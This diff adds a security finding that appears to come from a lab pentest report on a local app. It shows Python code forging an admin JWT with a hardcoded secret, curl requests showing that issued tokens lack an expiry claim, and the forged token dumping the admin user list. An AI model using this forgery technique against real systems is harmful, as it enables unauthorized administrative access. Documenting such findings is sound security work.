@@ -1,0 +1,39 @@
+== VULN-003 Token weakness: forged admin token via known secret ==
+# python-jose forgery with the fixed lab secret:
+from jose import jwt
+secret = 'techcorp-fixed-lab-secret-key-please-change'
+forged = jwt.encode({'sub': 'admin', 'type': 'access'}, secret, algorithm='HS256')
+
+Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInR5cGUiOiJhY2Nlc3MifQ.E80fSk1NGugOpzIZ4qBs4bF_AjfgxIDrf1Zf14XNTsI
+
+# No expiry (exp) claim is present on tokens issued by the app:
+curl -s -X POST http://127.0.0.1:8001/api/login -d '{"username":"user1","password":"password1"}'
+# decode payload -> claims = ['sub', 'type', 'iat']  (no 'exp')
+
+curl -s -H "Authorization: Bearer <forged_admin_token>" http://127.0.0.1:8001/api/admin/users
+[
+    {
+        "id": 1,
+        "username": "user1",
+        "email": "user1@techcorp.local",
+        "role": "USER",
+        "bio": "I work in the accounting department.",
+        "created_at": "2026-09-15T17:56:29.334726+05:30"
+    },
+    {
+        "id": 2,
+        "username": "user2",
+        "email": "user2@techcorp.local",
+        "role": "USER",
+        "bio": "Customer support team.",
+        "created_at": "2026-09-15T17:56:29.334738+05:30"
+    },
+    {
+        "id": 3,
+        "username": "admin",
+        "email": "admin@techcorp.local",
+        "role": "ADMIN",
+        "bio": "Platform administrator.",
+        "created_at": "2026-09-15T17:56:29.334742+05:30"
+    }
+]
